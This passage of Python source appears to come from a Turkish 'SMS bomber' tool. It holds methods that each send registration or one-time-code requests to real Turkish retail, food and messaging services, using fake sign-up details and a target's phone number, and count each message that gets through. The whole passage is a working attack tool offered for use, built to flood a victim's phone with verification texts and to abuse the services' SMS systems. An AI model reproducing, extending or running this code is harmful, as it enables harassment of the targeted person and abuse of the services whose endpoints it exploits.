            data = f"--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.random_mail}@gmail.com\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"repeatEmail\"\r\n\r\n{self.random_mail}\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"confirm2\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"tom_pay_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF--\r\n"
            yuzbir = requests.post(url, headers=headers,  data=data)
            if yuzbir.json()["phone"] == f"0{self.phone}":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr")


    #englishhome.com--sms
    def englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": f"{self.random_mail}@gmail.com", "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com")
            
            
    #sakasu.com.tr--sms
    def sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr")
            
    
    #rentiva.com--sms
    def rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"phone": self.phone, "phonePeriod": "never"}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com")
            
    
    #bineq.tech--sms
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V1//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&areaCode=90"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "SCOOBY/16 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            bineq = requests.post(url, headers=headers)
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineq.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineq.tech")
            
            
    #superpedestrian.com
    def Link(self):
        try:
            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Device": "D6AD4AE2-E842-4C4D-A42C-662E69A9651E/Apple/Unknown", "Accept-Encoding": "gzip, deflate", "User-Agent": "iOS/15.6.1 LINK/5.2.4/6197", "Accept-Language": "tr-GB", "Connection": "close"}
            json={"phone_number": f"+90{self.phone}"}
            link = requests.post(url, headers=headers, json=json)
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> superpedestrian.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> superpedestrian.com")

    
    #apaydinsupermarket.com
    def Aydin(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.apaydinsupermarket.com", "Dnt": "1", "Referer": "https://www.apaydinsupermarket.com/urunler/309/kurdan", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            data = {"cepTel": self.phone}
            aydin = requests.post("https://www.apaydinsupermarket.com/uye/uyeolMobile", headers=headers, data=data)
            if aydin.json()["result"]["statusMessage"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apaydinsupermarket.com")
                self.adet += 1
            else:
                raise    
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apaydinsupermarket.com")
            
            
    #loncamarket.com
    def Lonca(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            json={"Address": self.phone, "ConfirmationType": 0}
            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False)
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com")   
            
    
    #bizimtoptan.com.tr
    def Bizim(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.bizimtoptan.com.tr", "Dnt": "1", "Referer": "https://www.bizimtoptan.com.tr/register", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"Phone": self.phone, "Email": self.random_mail, "Password": "31ABC..abc31", "Resend": "true"}
            bizim = requests.post("https://www.bizimtoptan.com.tr/Customer/SendCustomerSmsValidationMessage", headers=headers, data=data)
            if bizim.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bizimtoptan.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bizimtoptan.com.tr")   
            
    
    #dgnonline.com
    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dgnonline.com")  
            
    
    #yaanimail.com
    def Yaani(self):
        try:
            url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "a@gmail.com"}, {"type": "msisdn", "value": f"90{self.phone}"}]}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> yaanimail.com")  
            
            
    #mcdonalds.com.tr
    def Mcdonalds(self):
        try:
            r = requests.get(f"https://siparis.mcdonalds.com.tr/login/SendSMSOtp?phone={self.phone}&smsPermit=1&epostaPermit=1")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mcdonalds.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mcdonalds.com.tr")
            
    
    #defacto.com.tr
    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"mobilePhone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr")
    
    
    #mopas.com.tr
    def Mopas(self):
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr")
            
            
    #hummel.com.tr
    def Hummel(self):
        try:
            r = requests.get(f"https://hummel.com.tr/Uye/CheckPhoneAndSendSms?phone={self.phone}")
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hummel.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hummel.com.tr")    
     
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> icq.net")
